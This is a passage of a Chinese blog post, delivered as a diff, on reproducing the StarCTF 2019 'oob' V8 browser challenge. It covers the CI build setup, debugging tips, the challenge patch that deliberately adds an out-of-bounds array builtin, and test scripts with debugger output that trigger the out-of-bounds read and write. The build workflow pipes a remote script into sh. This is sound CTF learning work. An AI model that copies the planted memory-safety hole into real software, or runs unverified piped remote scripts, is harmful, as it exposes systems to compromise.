@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="v8," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Archerの博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="start-oob复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="start-oob复现">
+<meta property="og:url" content="http://example.com/2022/05/17/starctf-oob%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Archerの博客">
+<meta property="og:description" content="start-oob复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2022-05-15102014.png">
+<meta property="og:image" content="http://example.com/images/2022-05-15202546.png">
+<meta property="og:image" content="http://example.com/images/2022-05-17113225.png">
+<meta property="article:published_time" content="2022-05-17T03:33:30.000Z">
+<meta property="article:modified_time" content="2022-05-17T06:36:27.042Z">
+<meta property="article:author" content="Archer">
+<meta property="article:tag" content="v8">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2022-05-15102014.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+
+
+
+
+  <title>start-oob复现 | Archerの博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Archerの博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录一个菜鸡的成长之路</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-about"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-categories"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archives"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/starctf-oob%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1652601666778.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Archerの博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">start-oob复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-05-17T11:33:30+08:00">
+                2022-05-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/v8/" itemprop="url" rel="index">
+                    <span itemprop="name">v8</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2022/05/17/starctf-oob%E5%A4%8D%E7%8E%B0/" class="leancloud_visitors" data-flag-title="start-oob复现">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+              <div class="post-description">
+                  start-oob复现
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>这里我使用github action直接在远程先配置好环境，然后再下载到本地<br>github action的yml文件如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">name: BUILD and Complie v8</span><br><span class="line"></span><br><span class="line">on:</span><br><span class="line">  push:</span><br><span class="line">    branches: [ master ]</span><br><span class="line">  <span class="comment"># watch:</span></span><br><span class="line">  <span class="comment">#   types: started</span></span><br><span class="line"></span><br><span class="line">env:</span><br><span class="line">  PATCH_FLAG: <span class="literal">true</span></span><br><span class="line">  COMMIT: 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">  DEPOT_UPLOAD: <span class="literal">true</span></span><br><span class="line">  SRC_UPLOAD: <span class="literal">true</span></span><br><span class="line">  BINARY_UPLOAD: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A workflow run is made up of one or more jobs that can run sequentially or in parallel</span></span><br><span class="line"><span class="built_in">jobs</span>:</span><br><span class="line">  build:</span><br><span class="line">    <span class="comment"># The type of runner that the job will run on</span></span><br><span class="line">    runs-on: ubuntu-18.04</span><br><span class="line">    <span class="keyword">if</span>: github.event.repository.owner.id == github.event.sender.id  </span><br><span class="line">    </span><br><span class="line">    steps:</span><br><span class="line">    - name: Checkout</span><br><span class="line">      uses: actions/checkout@master</span><br><span class="line">      </span><br><span class="line">    <span class="comment"># init ubuntu1804 environment</span></span><br><span class="line">    - name: init env</span><br><span class="line">      run: |</span><br><span class="line">        sudo apt-get update</span><br><span class="line">        sudo apt-get -y install pkg-config git subversion curl wget build-essential python xz-utils zip p7zip-full</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># get depot_tools</span></span><br><span class="line">    - name: depot_tools</span><br><span class="line">      run: |</span><br><span class="line">        git <span class="built_in">clone</span> https://github.com/sixstars/starctf2019.git</span><br><span class="line">        git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">        <span class="built_in">echo</span> <span class="built_in">export</span> PATH=\&quot;\<span class="variable">$PATH</span>:`<span class="built_in">pwd</span>`/depot_tools/\&quot; &gt;&gt; ~/.bash_profile</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fetch v8 source code</span></span><br><span class="line">    - name: fetch v8</span><br><span class="line">      run: |</span><br><span class="line">        <span class="built_in">source</span> ~/.bash_profile</span><br><span class="line">        fetch v8</span><br><span class="line">        <span class="built_in">cd</span> v8</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># patch source code</span></span><br><span class="line">    - name: patch v8</span><br><span class="line">      <span class="keyword">if</span>: env.PATCH_FLAG == <span class="string">&#x27;true&#x27;</span> &amp;&amp; !cancelled()</span><br><span class="line">      run: |</span><br><span class="line">        <span class="built_in">cd</span> v8</span><br><span class="line">        git reset --hard <span class="variable">$COMMIT</span></span><br><span class="line">        git apply ../starctf2019/pwn-OOB/oob.diff <span class="comment">#根据diff文件修改源码</span></span><br><span class="line">        <span class="built_in">cd</span> ..</span><br><span class="line">    </span><br><span class="line">    - name: setting ninja</span><br><span class="line">      run: |</span><br><span class="line">        sudo apt-get install libtool autoconf</span><br><span class="line">        git <span class="built_in">clone</span> https://github.com/skvadrik/re2c.git re2c</span><br><span class="line">        <span class="built_in">cd</span> re2c</span><br><span class="line">        mkdir -p m4</span><br><span class="line">        ./autogen.sh &amp;&amp; ./configure --prefix=/usr &amp;&amp; make</span><br><span class="line">        sudo make install</span><br><span class="line">        re2c -v</span><br><span class="line">        <span class="built_in">cd</span> ..</span><br><span class="line">        git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line">        <span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line">    </span><br><span class="line">    - name: Complie v8</span><br><span class="line">      run: |</span><br><span class="line">        <span class="built_in">source</span> ~/.bash_profile</span><br><span class="line">        gclient sync -D</span><br><span class="line">        <span class="built_in">cd</span> v8</span><br><span class="line">        ls -l</span><br><span class="line">        tools/dev/v8gen.py x64.debug</span><br><span class="line">        ninja -C out.gn/x64.debug</span><br><span class="line">        tools/dev/v8gen.py x64.release</span><br><span class="line">        ninja -C out.gn/x64.release</span><br><span class="line">        <span class="built_in">cd</span> ..</span><br><span class="line">    <span class="comment"># compress this file</span></span><br><span class="line">    - name: zip depot_tools</span><br><span class="line">      <span class="keyword">if</span>: env.DEPOT_UPLOAD == <span class="string">&#x27;true&#x27;</span> &amp;&amp; !cancelled()</span><br><span class="line">      run: |</span><br><span class="line">        zip -q -r depot_tools.zip depot_tools</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 7zip v8 src</span></span><br><span class="line">    - name: 7zip v8_src</span><br><span class="line">      run: |</span><br><span class="line">        zip -q -r v8.zip v8</span><br><span class="line">        7z a v8.7z ./v8.zip -v2048m</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># upload depot_tools.zip to cowtransfer</span></span><br><span class="line">    - name: upload depot_tools</span><br><span class="line">      <span class="keyword">if</span>: env.DEPOT_UPLOAD == <span class="string">&#x27;true&#x27;</span> &amp;&amp; !cancelled()</span><br><span class="line">      run: |</span><br><span class="line">        curl -fsSL git.io/file-transfer | sh</span><br><span class="line">        ./transfer muse -s -p 64 --no-progress depot_tools.zip 2&gt;&amp;1 | tee cowtransfer.log</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;::warning file=cowtransfer.com::<span class="subst">$(cat cowtransfer.log | grep https)</span>&quot;</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment"># upload v8.zip to cowtransfer</span></span><br><span class="line">    - name: upload v8_src</span><br><span class="line">      <span class="keyword">if</span>: env.SRC_UPLOAD == <span class="string">&#x27;true&#x27;</span> &amp;&amp; !cancelled()</span><br><span class="line">      run: |</span><br><span class="line">        ls -l</span><br><span class="line">        curl -fsSL git.io/file-transfer | sh</span><br><span class="line">        ./transfer muse -s -p 64 --no-progress v8.7z.001 2&gt;&amp;1 | tee cowtransfer.log</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;::warning file=cowtransfer.com::<span class="subst">$(cat cowtransfer.log | grep https)</span>&quot;</span></span><br><span class="line">        ./transfer muse -s -p 64 --no-progress v8.7z.002 2&gt;&amp;1 | tee cowtransfer.log</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;::warning file=cowtransfer.com::<span class="subst">$(cat cowtransfer.log | grep https)</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>oob.diff地址如下:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sixstars/starctf2019.git</span><br></pre></td></tr></table></figure>
+<p>修改文件命令如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply ../starctf2019/pwn-OOB/oob.diff</span><br></pre></td></tr></table></figure>
+<p>使用exp测试环境<br><img src="/images/2022-05-15102014.png" alt="avatar"><br>可以看到执行了sh命令，此时就可以开始复现了</p>
+<h2 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h2><p>在js中可以嵌入如下打印变量的值(需要添加–allow-natives-syntax)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="string">``</span><span class="string">``</span></span><br><span class="line">设置断点，方便gdb调试</span><br><span class="line"><span class="string">``</span><span class="string">`js</span></span><br><span class="line"><span class="string">%SystemBreak();</span></span><br></pre></td></tr></table></figure>
+<p>gdb结合d8调试方式入下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line"><span class="built_in">set</span> args --allow-natives-syntax ./test.js</span><br><span class="line">gdb &gt; r</span><br></pre></td></tr></table></figure>
+<p>在调试release版本时，如果发现DebugPrint只是输出了一个地址，可以在编译时，添加v8_enable_object_print = true<br>如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gn gen out/x64.release --args=<span class="string">&#x27;v8_enable_object_print = true&#x27;</span></span><br><span class="line">ninja -C out/x64.release d8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="diff文件分析"><a href="#diff文件分析" class="headerlink" title="diff文件分析"></a>diff文件分析</h2><p>如下</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
+<p>编写test.js测试oob函数中注释的read处</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> c = a.oob();</span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
+<p>数组的结构如下:<br><img src="/images/2022-05-15202546.png" alt="avatar"><br>使用c到下一个断点如下:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">0x3c7619d8ddc9 &lt;HeapNumber 2.86852e-310&gt;</span><br></pre></td></tr></table></figure>
+<p>此时看一下内容</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x3c7619d8ddc9</span><br><span class="line">2.86852e-310</span><br><span class="line">pwndbg&gt; telescope 0x3c7619d8ddc8</span><br><span class="line">00:0000│  0x3c7619d8ddc8 —▸ 0x34ce08d00561 ◂— 0x2000034ce08d001</span><br><span class="line">01:0008│  0x3c7619d8ddd0 —▸ 0x34ce08d00851 ◂— 0x34ce08d001</span><br><span class="line">02:0010│  0x3c7619d8ddd8 ◂— 0x0</span><br><span class="line">... ↓     5 skipped</span><br></pre></td></tr></table></figure>
+<p>很明显oob函数返回了a[len]，这里存在越界读<br>此时再继续测试oob函数的write处<br>test.js入下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">1</span>);</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
+<p>初始情况下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x38758e50dd20 10</span><br><span class="line">00:0000│  0x38758e50dd20 —▸ 0x216327600851 ◂— 0x2163276001</span><br><span class="line">01:0008│  0x38758e50dd28 ◂— 0x500000000</span><br><span class="line">02:0010│  0x38758e50dd30 ◂— 0x100000000</span><br><span class="line">03:0018│  0x38758e50dd38 ◂— 0x200000000</span><br><span class="line">04:0020│  0x38758e50dd40 ◂— 0x300000000</span><br><span class="line">05:0028│  0x38758e50dd48 ◂— 0x400000000</span><br><span class="line">06:0030│  0x38758e50dd50 ◂— 0x500000000</span><br><span class="line">07:0038│  0x38758e50dd58 —▸ 0x216327600851 ◂— 0x2163276001</span><br><span class="line">08:0040│  0x38758e50dd60 ◂— 0x400000000</span><br><span 